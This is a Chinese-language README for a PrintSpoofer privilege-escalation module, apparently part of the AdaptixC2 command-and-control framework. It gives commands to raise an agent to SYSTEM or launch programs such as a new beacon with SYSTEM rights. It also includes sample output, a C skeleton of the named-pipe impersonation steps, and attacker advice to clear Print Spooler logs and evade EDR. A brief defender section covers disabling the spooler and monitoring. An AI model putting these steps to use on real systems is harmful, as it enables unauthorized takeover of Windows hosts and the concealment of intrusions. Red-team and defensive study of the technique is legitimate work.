# PrintSpoofer BOF

## 概述

PrintSpoofer 是一种本地权限提升技术，通过滥用 Windows Print Spooler 服务实现从普通用户或服务账户提升到 SYSTEM 权限。

## 原理

### 技术背景

Print Spooler 服务（spoolsv.exe）以 SYSTEM 权限运行，负责管理打印队列和打印机端口。该服务在与客户端通信时会使用 Named Pipes，当客户端创建特定的 Named Pipe 并触发 Print Spooler 连接时，可以通过 `ImpersonateNamedPipeClient` API 窃取 SYSTEM token。

### 攻击流程

1. **创建 Named Pipe**: 创建一个随机命名的 Named Pipe
2. **触发连接**: 使用 Print Spooler 的 XcvData API 添加端口，触发服务连接到我们的 Pipe
3. **等待连接**: 等待 Print Spooler 服务连接
4. **Impersonate**: 调用 `ImpersonateNamedPipeClient` 窃取 SYSTEM token
5. **提权**: 使用 token 提升当前线程或创建新进程

## 使用方法

### 基本语法

```bash
printspoofer [--token | --run <program>]
```

### 参数说明

- `--token`: 将当前 agent 提升到 SYSTEM 上下文
- `--run <program>`: 以 SYSTEM 权限运行指定程序（带参数）

**注意**: `--token` 和 `--run` 互斥，只能使用其中一个

### 使用示例

#### 示例 1: 提升当前 Agent

```bash
printspoofer --token
```

**输出示例**:
```
[*] PrintSpoofer - Local Privilege Escalation
[*] Technique: Named Pipe Impersonation via Print Spooler

[*] Named Pipe created: \\.\pipe\printspoof1a2b3c4d
[*] Triggering named pipe connection via Print Spooler...
[+] Triggered Print Spooler connection
[*] Waiting for connection (timeout: 5000 ms)...
[+] Client connected!
[*] Attempting to impersonate client...
[+] Impersonation successful!
[+] Obtained SYSTEM (S-1-5-18) token with impersonation level: Impersonation
[+] SYSTEM token applied to current thread!
[+] Impersonate to SYSTEM succeeded

[*] PrintSpoofer completed
```

**效果**:
- ✅ 当前 agent 的线程切换到 SYSTEM 上下文
- ✅ 后续命令以 SYSTEM 权限执行
- ✅ Agent UI 显示 "impersonated: SYSTEM"

#### 示例 2: 以 SYSTEM 运行命令

```bash
printspoofer --run "C:\Windows\System32\cmd.exe /c whoami > C:\temp\result.txt"
```

**输出示例**:
```
[*] PrintSpoofer - Local Privilege Escalation
[*] Technique: Named Pipe Impersonation via Print Spooler

[*] Named Pipe created: \\.\pipe\printspoof5e6f7a8b
[*] Triggering named pipe connection via Print Spooler...
[+] Triggered Print Spooler connection
[*] Waiting for connection (timeout: 5000 ms)...
[+] Client connected!
[*] Attempting to impersonate client...
[+] Impersonation successful!
[+] Obtained SYSTEM (S-1-5-18) token with impersonation level: Impersonation
[*] Starting process: C:\Windows\System32\cmd.exe /c whoami > C:\temp\result.txt
[+] Process created with PID: 4532

[*] PrintSpoofer completed
```

**效果**:
- ✅ 新进程以 SYSTEM 权限运行
- ✅ 当前 agent 不受影响

#### 示例 3: 部署新 Beacon

```bash
printspoofer --run "C:\temp\beacon.exe"
```

**用途**: 
- 创建一个新的 SYSTEM 权限 beacon
- 原 beacon 保持不变

## 适用场景

### ✅ 适合使用的场景

1. **服务账户 (Service Account)**
   - 已经有 `SeImpersonatePrivilege` 权限
   - Print Spooler 服务正在运行
   - 目标：提升到 SYSTEM

2. **低权限用户 + Print Spooler 运行**
   - 普通用户账户
   - Print Spooler 服务启动
   - 目标：从用户提升到 SYSTEM

3. **绕过 UAC 后**
   - 已通过 UAC bypass 获得 High Integrity
   - 需要进一步提升到 SYSTEM

4. **已有部分权限**
   - IIS 应用程序池账户
   - SQL Server 服务账户
   - 其他服务账户

### ❌ 不适合使用的场景

1. **Print Spooler 服务未启动**
   ```bash
   # 检查服务状态
   shell sc query spooler
   ```
   如果服务未运行，PrintSpoofer 将失败

2. **已经是 SYSTEM**
   - 无需再提权
   - 建议先检查当前权限: `shell whoami /priv`

3. **完全受限环境**
   - 无法创建 Named Pipe
   - 无法与 Print Spooler 交互

## 前置条件

### 必须条件

1. **Print Spooler 服务运行**
   ```bash
   shell sc query spooler
   ```
   状态应为 `RUNNING`

2. **能够创建 Named Pipe**
   - 通常所有用户都有此权限
   
3. **能够调用 Print Spooler API**
   - 需要能够访问 Winspool API

### 推荐条件

- **SeImpersonatePrivilege 权限** (虽然不是强制的)
  ```bash
  shell whoami /priv
  ```

## 兼容性

### Windows 版本

| 版本 | 兼容性 | 说明 |
|------|--------|------|
| **Windows 10** | ✅ | 完全支持 |
| **Windows 11** | ✅ | 完全支持 |
| **Windows Server 2016** | ✅ | 完全支持 |
| **Windows Server 2019** | ✅ | 完全支持 |
| **Windows Server 2022** | ✅ | 完全支持 |
| **Windows 7/8/8.1** | ✅ | 支持（如果 Print Spooler 运行） |
| **Windows Server 2012/2012R2** | ✅ | 支持 |

### 架构

- ✅ **x64** (已编译并测试)
- ⚠️ **x86** (理论支持，需额外编译)

## 与其他提权方法对比

| 方法 | 前置条件 | 成功率 | 隐蔽性 | 速度 |
|------|---------|--------|--------|------|
| **PrintSpoofer** | Print Spooler 运行 | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **DCOMPotato** | SeImpersonate | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **GodPotato** | SeImpersonate | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **GetSystem Token** | TrustedInstaller 服务 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

### PrintSpoofer 优势

1. ✅ **不需要 SeImpersonate** (虽然有更好)
2. ✅ **速度快** (通常 < 2 秒)
3. ✅ **成功率高** (只要 Print Spooler 运行)
4. ✅ **内存执行** (BOF 形式)

### PrintSpoofer 劣势

1. ❌ **依赖 Print Spooler** (服务器可能禁用)
2. ❌ **可能被 EDR 监控** (Named Pipe 创建)
3. ❌ **需要触发 XcvData** (有日志)

## 常见问题

### Q1: 失败并显示 "OpenPrinter failed"

**原因**: 无法打开 Print Spooler 的 XcvMonitor

**解决方法**:
1. 检查 Print Spooler 是否运行: `shell sc query spooler`
2. 尝试启动服务: `shell sc start spooler` (需要管理员权限)
3. 如果服务被禁用，考虑其他提权方法

### Q2: 失败并显示 "Timeout waiting for connection"

**原因**: Print Spooler 未能连接到 Named Pipe

**解决方法**:
1. 检查 Print Spooler 服务状态
2. 查看 Windows Event Log 中的错误
3. 尝试重新执行命令
4. 考虑使用其他 Potato 变种

### Q3: 获得 token 但不是 SYSTEM

**原因**: Print Spooler 可能以非 SYSTEM 账户运行（罕见）

**解决方法**:
- 检查 Print Spooler 的运行账户: `shell sc qc spooler`
- 正常情况下应该是 `LocalSystem`

### Q4: 是否会留下日志？

**是的**，PrintSpoofer 会留下一些痕迹：

1. **Print Spooler Event Log**
   - 事件 ID: 372 (添加端口)
   - 事件 ID: 315 (端口操作)

2. **Named Pipe 创建**
   - Sysmon Event ID 17/18 (如果启用)

3. **进程创建**
   - 如果使用 `--run`，会有进程创建日志

**建议**: 
- 攻击完成后清理 Print Spooler 日志
- 使用 `--token` 模式以减少进程创建痕迹

### Q5: 能否绕过 EDR？

**部分绕过**:

1. ✅ **BOF 形式**: 内存执行，无磁盘落地
2. ✅ **Native API**: 使用 Windows 原生 API
3. ⚠️ **行为监控**: 可能被 EDR 的行为分析检测（Named Pipe + Impersonate）
4. ❌ **日志监控**: 无法避免 Print Spooler 日志

**对抗策略**:
- 快速提权，立即执行任务
- 提权后清理日志
- 结合其他混淆技术

## 技术细节

### Named Pipe Impersonation

```c
// 1. 创建 Named Pipe
HANDLE hPipe = CreateNamedPipeA(
    "\\\\.\\pipe\\printspoof12345678",
    PIPE_ACCESS_DUPLEX,
    PIPE_TYPE_BYTE | PIPE_WAIT,
    10, 2048, 2048, 0, NULL
);

// 2. 触发 Print Spooler 连接
OpenPrinterW(L",XcvMonitor Local Port", &hPrinter, &pd);
XcvDataW(hPrinter, L"AddPort", ...);

// 3. 等待连接
ConnectNamedPipe(hPipe, &overlapped);

// 4. Impersonate
ImpersonateNamedPipeClient(hPipe);

// 5. 获取 token
OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
```

### 与原版 PrintSpoofer 的差异

本 BOF 实现基于 [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 的原理，但有以下改进：

1. ✅ **BOF 形式**: 内存执行，无需上传 EXE
2. ✅ **AdaptixC2 集成**: 与 Agent 无缝集成
3. ✅ **AxScript 支持**: 支持自定义脚本扩展
4. ✅ **错误处理**: 更完善的错误提示
5. ✅ **Token 管理**: 自动管理 token 状态

## 安全注意事项

### 防御者视角

如果您是防御者，可以采取以下措施：

1. **禁用 Print Spooler** (如果不需要)
   ```powershell
   Stop-Service -Name Spooler
   Set-Service -Name Spooler -StartupType Disabled
   ```

2. **监控 Named Pipe 创建**
   - 启用 Sysmon Event ID 17/18
   - 监控可疑的 pipe 名称 (如 `printspoof*`)

3. **监控 Print Spooler 日志**
   - 事件 ID 372, 315
   - 异常端口添加

4. **限制 Impersonate 权限**
   - 审计 `SeImpersonatePrivilege` 的使用

### 攻击者视角

1. **快速执行**: 减少被检测时间
2. **清理痕迹**: 提权后立即清理日志
3. **组合技术**: 结合其他提权方法
4. **备选方案**: 准备 GodPotato、DCOMPotato 作为后备

## 参考资料

1. [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) - 原版 PrintSpoofer
2. [Print Spooler 权限提升原理](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
3. [Named Pipe Impersonation 技术详解](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-impersonation)

## 更新日志

- **v1.0** (2025-10-26)
  - 初始实现
  - 支持 --token 和 --run 模式
  - x64 架构支持
  - AdaptixC2 集成

## 贡献

本 BOF 是 AdaptixC2 项目的一部分。

---

**作者**: AdaptixC2 Team  
**版本**: v1.0  
**最后更新**: 2025-10-26

